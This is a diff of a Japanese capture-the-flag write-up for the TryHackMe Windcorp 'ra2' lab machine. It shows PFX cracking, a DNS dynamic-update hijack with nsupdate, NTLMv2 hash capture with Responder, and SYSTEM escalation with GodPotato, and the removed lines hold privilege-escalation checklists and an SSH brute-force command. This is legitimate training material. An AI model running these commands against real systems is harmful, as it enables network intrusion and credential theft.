@@ -5,7 +5,7 @@ https://tryhackme.com/room/ra2
 ## Enumeration
 
 ```shell
-TARGET=10.48.177.43
+TARGET=10.48.173.61
 sudo bash -c "echo $TARGET   ra2.thm fire.windcorp.thm >> /etc/hosts"
 ```
 
@@ -275,7 +275,7 @@ hashを出力
 $ pfx2john ./cert.pfx > pfx_hash
 ```
 
-rockyouを使ったら一瞬で終わった。
+rockyouで一瞬でパスワードは判明した。
 
 ```sh
 $ john --wordlist=/usr/share/wordlists/rockyou.txt ./pfx_hash
@@ -291,96 +291,337 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
+パスワードを使ってpfxファイルを開けた。
 
 ```sh
-# Kerberoasting
-GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.194.124 -request
+$ openssl pkcs12 -info -in ./cert.pfx
+Enter Import Password:
+MAC: sha256, Iteration 2000
+MAC length: 32, salt length: 20
+PKCS7 Data
+Shrouded Keybag: PBES2, PBKDF2, AES-256-CBC, Iteration 2000, PRF hmacWithSHA256
+Bag Attributes
+    Microsoft Local Key set: <No Values>
+    localKeyID: 01 00 00 00 
+    friendlyName: te-4b942170-a078-48b3-80cb-e73333376b73
+    Microsoft CSP Name: Microsoft Software Key Storage Provider
+Key Attributes
+    X509v3 Key Usage: 90 
+Enter PEM pass phrase:
+Verifying - Enter PEM pass phrase:
+-----BEGIN ENCRYPTED PRIVATE KEY-----
+MIIFNTBfBgkqhkiG9w0BBQ0wUjAxBgkqhkiG9w0BBQwwJAQQ1bXL7VmVPj5AKepU
+略
+m6tDxKdrLcEzemtwqJgE4qmreybygZUUAAzpbbrYmLOjTLl9FK6c2+8=
+-----END ENCRYPTED PRIVATE KEY-----
+PKCS7 Encrypted data: PBES2, PBKDF2, AES-256-CBC, Iteration 2000, PRF hmacWithSHA256
+Certificate bag
+Bag Attributes
+    localKeyID: 01 00 00 00 
+subject=CN=fire.windcorp.thm
+issuer=CN=fire.windcorp.thm
+-----BEGIN CERTIFICATE-----
+MIIDajCCAlKgAwIBAgIQUI2QvXTCj7RCVdv6XlGMvjANBgkqhkiG9w0BAQsFADAc
+略
+MTUqFyYKchFUeYlgf7k=
+-----END CERTIFICATE-----
 ```
 
-## 権限昇格
+これを使って、fire.windcorp.thm の下のサービスを認証できる可能性がある。  
+/powershell のインターフェースがあったことを思い出す。
+
+Firefoxでpfxファイルをインポートして /poershell にアクセスしたが、変わらず認証画面が表示されただけ。selfservice の方も変わらずBASIC認証が表示された。
+
+行き詰ってウォークスルーを見た。  
+dnsrecon でフラグ１が表示される。
 
 ```sh
-# env_keep+=LD_PRELOAD は見落としがちなので注意
-sudo -l
+$ dnsrecon -d windcorp.thm -n $TARGET 
+[*] std: Performing General Enumeration against: windcorp.thm...
+[-] DNSSEC is not configured for windcorp.thm
+[*]      SOA fire.windcorp.thm 192.168.112.1
+[*]      SOA fire.windcorp.thm 10.48.173.61
+[*]      NS fire.windcorp.thm 192.168.112.1
+[*]      NS fire.windcorp.thm 10.48.173.61
+[*]      A windcorp.thm 10.48.173.61
+[*]      TXT windcorp.thm THM{[REDACTED]}
+[*] Enumerating SRV Records
+[+]      SRV _kerberos._tcp.windcorp.thm fire.windcorp.thm 10.48.173.61 88
+[+]      SRV _kerberos._tcp.windcorp.thm fire.windcorp.thm 192.168.112.1 88
+[+]      SRV _kerberos._udp.windcorp.thm fire.windcorp.thm 192.168.112.1 88
+[+]      SRV _kerberos._udp.windcorp.thm fire.windcorp.thm 10.48.173.61 88
+[+]      SRV _gc._tcp.windcorp.thm fire.windcorp.thm 10.48.173.61 3268
+[+]      SRV _gc._tcp.windcorp.thm fire.windcorp.thm 192.168.112.1 3268
+[+]      SRV _ldap._tcp.windcorp.thm fire.windcorp.thm 192.168.112.1 389
+[+]      SRV _ldap._tcp.windcorp.thm fire.windcorp.thm 10.48.173.61 389
+[+]      SRV _ldap._tcp.ForestDNSZones.windcorp.thm fire.windcorp.thm 192.168.112.1 389
+[+]      SRV _ldap._tcp.ForestDNSZones.windcorp.thm fire.windcorp.thm 10.48.173.61 389
+[+]      SRV _ldap._tcp.pdc._msdcs.windcorp.thm fire.windcorp.thm 10.48.173.61 389
+[+]      SRV _ldap._tcp.pdc._msdcs.windcorp.thm fire.windcorp.thm 192.168.112.1 389
+[+]      SRV _ldap._tcp.dc._msdcs.windcorp.thm fire.windcorp.thm 192.168.112.1 389
+[+]      SRV _ldap._tcp.dc._msdcs.windcorp.thm fire.windcorp.thm 10.48.173.61 389
+[+]      SRV _ldap._tcp.gc._msdcs.windcorp.thm fire.windcorp.thm 10.48.173.61 3268
+[+]      SRV _ldap._tcp.gc._msdcs.windcorp.thm fire.windcorp.thm 192.168.112.1 3268
+[+]      SRV _kpasswd._tcp.windcorp.thm fire.windcorp.thm 192.168.112.1 464
+[+]      SRV _kpasswd._tcp.windcorp.thm fire.windcorp.thm 10.48.173.61 464
+[+]      SRV _kerberos._tcp.dc._msdcs.windcorp.thm fire.windcorp.thm 192.168.112.1 88
+[+]      SRV _kerberos._tcp.dc._msdcs.windcorp.thm fire.windcorp.thm 10.48.173.61 88
+[+]      SRV _kpasswd._udp.windcorp.thm fire.windcorp.thm 10.48.173.61 464
+[+]      SRV _kpasswd._udp.windcorp.thm fire.windcorp.thm 192.168.112.1 464
+[+] 22 Records Found
+```
+
+フラグの文章がこうなっている。
+
+```
+安全でない動的更新を許可することは、信頼できないソースからの更新を受け入れる可能性があるため、重大なセキュリティ脆弱性となります。
+```
+
+DNS動的更新で、selfservice を自分のマシンに向けさせる。
+
+```sh
+$ nsupdate
+> server 10.48.173.61
+> update delete selfservice.windcorp.thm
+> send
+> update add selfservice.windcorp.thm 600 A 192.168.129.39
+> send
+```
+
+pfxファイル＋responderで、ハッシュをキャッチ。  
+これはhashcatでクラックでき、edwardle のパスワードを入手成功。
+
+```sh
+nano /etc/responder/Responder.conf
+
+[HTTPS Server]
+; Configure SSL Certificates to use
+SSLCert = /home/kali/ctf/ra2/cert.pem
+SSLKey = /home/kali/ctf/ra2/key.pem
 ```
 
 ```sh
-find / -perm -u=s -type f -ls 2>/dev/null
+[HTTP] NTLMv2 Client   : 10.48.173.61
+[HTTP] NTLMv2 Username : WINDCORP\edwardle
+[HTTP] NTLMv2 Hash     : edwardle::WINDCORP:fe2b731aef5cbb5d:079EECCE7F93E6C488BF1076FCA3863F:0101000000000000BE0F[REDACTED]                                                               
+[*] Skipping previously captured hash for WINDCORP\edwardle
+```
+
+RDP, SMBで認証成功。ただし、RDPは実際に接続しても権限不足で表示できなかった。
+
+```sh
+$ nxc winrm $TARGET -u 'edwardle' -p '[REDACTED]'
+nxc rdp $TARGET -u 'edwardle' -p '[REDACTED]'
+nxc smb $TARGET -u 'edwardle' -p '[REDACTED]'
+
+RDP         10.49.171.189   3389   FIRE             [*] Windows 10 or Windows Server 2016 Build 17763 (name:FIRE) (domain:windcorp.thm) (nla:True)
+RDP         10.49.171.189   3389   FIRE             [+] windcorp.thm\edwardle:[REDACTED] (Pwn3d!)
+SMB         10.49.171.189   445    FIRE             [*] Windows 10 / Server 2019 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
+SMB         10.49.171.189   445    FIRE             [+] windcorp.thm\edwardle:[REDACTED] 
+```
+
+ケルベロースティングでは何も出ず。
+
+```sh
+$ GetUserSPNs.py 'windcorp.thm/edwardle:[REDACTED]' -dc-ip $TARGET -request
+/home/kali/myenv/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+No entries found!
+```
+
+Shared, Users 共有を発見。Sharedは空。
+
+```sh
+$ smbclient -L //$TARGET -U "windcorp\edwardle"
+Password for [WINDCORP\edwardle]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        Shared          Disk      
+        SYSVOL          Disk      Logon server share 
+        Users           Disk
 ```
 
 ```sh
-find / -user <name> -type f -not -path "/proc/*" 2>/dev/null
-find / -group <group> -type f -not -path "/proc/*" 2>/dev/null
+$ smbclient //$TARGET/Users -U "windcorp\edwardle"
+Password for [WINDCORP\edwardle]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Mon Jun  1 08:51:05 2020
+  ..                                 DR        0  Mon Jun  1 08:51:05 2020
+  .NET v4.5                           D        0  Sat May 30 13:57:25 2020
+  .NET v4.5 Classic                   D        0  Sat May 30 13:57:20 2020
+  Administrator                       D        0  Sun May 10 07:18:11 2020
+  All Users                       DHSrn        0  Sat Sep 15 03:28:48 2018
+  angrybird                           D        0  Fri May  1 08:59:20 2020
+  berg                                D        0  Fri May  1 08:59:20 2020
+  bluefrog579                         D        0  Fri May  1 08:59:20 2020
+  brittanycr                          D        0  Sat May  2 19:36:46 2020
+  brownostrich284                     D        0  Fri May  1 08:59:20 2020
+  buse                                D        0  Thu May 28 21:20:53 2020
+  Default                           DHR        0  Thu Apr 30 19:35:11 2020
+  Default User                    DHSrn        0  Sat Sep 15 03:28:48 2018
+  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018
+  edwardle.WINDCORP                   D        0  Fri May 29 01:31:47 2020
+  freddy                              D        0  Sat May  2 19:30:16 2020
+  garys                               D        0  Fri May  1 08:59:20 2020
+  goldencat416                        D        0  Mon Mar 16 01:36:36 2026
+  goldenwol                           D        0  Fri May  1 08:59:20 2020
+  happ                                D        0  Fri May  1 08:59:20 2020
+  happyme                             D        0  Fri May  1 08:59:20 2020
+  Luis                                D        0  Fri May  1 08:59:20 2020
+  orga                                D        0  Fri May  1 08:59:20 2020
+  organicf                            D        0  Fri May  1 08:59:20 2020
+  organicfish718                      D        0  Mon Mar 16 01:32:34 2026
+  pete                                D        0  Fri May  1 08:59:20 2020
+  Public                             DR        0  Thu Apr 30 10:35:47 2020
+  purplecat                           D        0  Fri May  1 08:59:20 2020
+  purplepanda                         D        0  Fri May  1 08:59:20 2020
+  sadswan                             D        0  Fri May  1 08:59:20 2020
+  sadswan869                          D        0  Mon Mar 16 01:32:19 2026
+  sheela                              D        0  Fri May  1 08:59:20 2020
+  silver                              D        0  Fri May  1 08:59:20 2020
+  smallf                              D        0  Fri May  1 08:59:20 2020
+  spiff                               D        0  Fri May  1 08:59:20 2020
+  tinygoos                            D        0  Fri May  1 08:59:20 2020
+  whiteleopard                        D        0  Fri May  1 08:59:20 2020
+
+                15587583 blocks of size 4096. 10681195 blocks available
 ```
+
+デスクトップでフラグを発見。
 
 ```sh
-getcap -r / 2>/dev/null
-ls -al /var/backups
-cat /etc/crontab
-cat /etc/exports
+smb: \edwardle.WINDCORP\Desktop\> ls
+  .                                  DR        0  Mon Jun  1 15:25:46 2020
+  ..                                 DR        0  Mon Jun  1 15:25:46 2020
+  desktop.ini                       AHS      282  Fri May 29 01:31:47 2020
+  Flag 2.txt                          A       47  Sun May 31 13:12:25 2020
 ```
 
-どうしても何も見つからない場合の最後の手段として、linpeasのCVEリストに有効なものがないか確認する。
+ダウンロードフォルダに怪しいファイルがある。
+
+```sh
+smb: \edwardle.WINDCORP\Downloads\> ls
+  .                                  DR        0  Sat May 30 15:53:54 2020
+  ..                                 DR        0  Sat May 30 15:53:54 2020
+  desktop.ini                       AHS      282  Fri May 29 01:31:47 2020
+  nc.exe                              A    59392  Sat May 30 15:53:54 2020
+  NtApiDotNet.dll                     A  1761792  Sat May 30 15:37:29 2020
+  SweetPotato.exe                     A   153600  Sat May 30 15:38:03 2020
+```
+
+## powershell
+
+Web に powershell インターフェースがあったことを思い出した。  
+https//fire.windcorp.thm/powershell にログインできた。
+
+```ps
+PS C:\Users\edwardle.WINDCORP\Documents> 
+whoami
+windcorp\edwardle
+```
+
+SeImpersonatePrivilege 権限が有効になっている。
+
+```ps
+PS C:\Users\edwardle.WINDCORP\Documents> 
+whoami /priv
+ 
+PRIVILEGES INFORMATION
+----------------------
+ 
+Privilege Name                Description                               State  
+============================= ========================================= =======
+SeMachineAccountPrivilege     Add workstations to domain                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
+```
+
+SweetPotato.exe がうまく動作しなかったので、GodPotato をアップロードした。
+
+```ps
+PS C:\Users\edwardle.WINDCORP\Downloads> 
+.\GodPotato.exe -cmd "cmd /c whoami"
+[*] CombaseModule: 0x140728420728832
+[*] DispatchTable: 0x140728423038160
+[*] UseProtseqFunction: 0x140728422419312
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\5a9f28b8-3653-4466-86a2-22efdbd6081a\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00008c02-0f6c-ffff-20d4-0dff7229552f
+[*] DCOM obj OXID: 0x3e53ede9a4f97872
+[*] DCOM obj OID: 0xcdbfa7478d8f72c3
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 1000 Token:0x620  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 5896
+```
+
+管理者フラグを読む。
+
+```ps
+PS C:\Users\edwardle.WINDCORP\Downloads> 
+.\GodPotato.exe -cmd 'cmd /c type C:\Users\Administrator\Desktop\Flag*3.txt'
+[*] CombaseModule: 0x140728420728832
+[*] DispatchTable: 0x140728423038160
+[*] UseProtseqFunction: 0x140728422419312
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\cf1ffbfa-c3b0-455d-9363-12febb13b9dd\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 0000d402-15e8-ffff-c7ed-1f98a6d21b11
+[*] DCOM obj OXID: 0x9909abe7e7a5038f
+[*] DCOM obj OID: 0xa9606a6b71c62517
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 1000 Token:0x620  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 1756
+ 
+C:\Users\Administrator\Desktop\Flag 3.txt
+ 
+ 
+THM{[REDACTED]}
+```
 
 ## 振り返り
 
--
--
+- dnsrecon のフラグ発見はかなり難しいと感じた。
+- pfxファイル入手からDNS動的更新、Responderのコンボは初見でとても良い勉強になった。
+- pfxファイルからキーや証明書をエクスポートする方法
+- pfxファイルを Responder で使ってHTTPSサーバーとして動作する方法
+- DNS動的更新の操作方法
 
 ## Tags
 
-#tags: #tags: #tags:
-
-```sh
-# 大分類（Linuxはタグ付けしない）
-Window Kerberos pwn pwn(Windows) Crypto puzzle ウサギの穴 LLM
-
-# 脆弱性の種類
-CVE-xxxx-yyyyy カーネルエクスプロイト
-ツール脆弱性 sudo脆弱性 PHP脆弱性 exiftool脆弱性 アプリケーション保存の認証情報 証明書テンプレート
-
-# 攻撃の種類
-サービス LFI SSRF XSS SQLインジェクション 競合 認証バイパス フィルターバイパス アップロードフィルターバイパス ポートノッキング PHPフィルターチェーン レート制限回避 XSSフィルターバイパス　SSTIフィルターバイパス RequestCatcher プロンプトインジェクション Defender回避 リバースコールバック LD_PRELOAD セッションID AVバイパス UACバイパス AMSIバイパス PaddingOracles
-
-# ツールなど
-docker fail2ban modbus ルートキット gdbserver jar joomla MQTT CAPTCHA git tmux john redis rsync pip potato ligolo-ng insmod pickle
-```
-
-## メモ
-
-### シェル安定化
-
-```shell
-# python が無くても、python3 でいける場合もある
-python -c 'import pty; pty.spawn("/bin/bash")'
-export TERM=xterm
-
-# Ctrl+Z でバックグラウンドにした後に
-stty raw -echo; fg
-
-#（終了後）エコー無効にして入力非表示になっているので
-reset
-
-# まず、他のターミナルを開いて rows, columns の値を調べる
-stty -a
-
-# リバースシェルで rows, cols を設定する
-stty rows 52
-stty cols 236
-```
-
-### SSH
-
-ユーザー名、パスワード（スペース区切り）ファイルを使ってSSHスキャンする
-
-```sh
-msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; set RHOSTS 10.10.165.96; set USERPASS_FILE creds.txt; run; exit"
-```
-
-エラー
-
-```sh
-# no matching host key type found. Their offer: ssh-rsa,ssh-dss
-# このエラーが出るのはサーバー側のバージョンが古いためなので、下記オプション追加。
--oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedAlgorithms=ssh-rsa
-```
+#tags:DNS #tags:Kerberos #tags:Windows #tags:Potato 
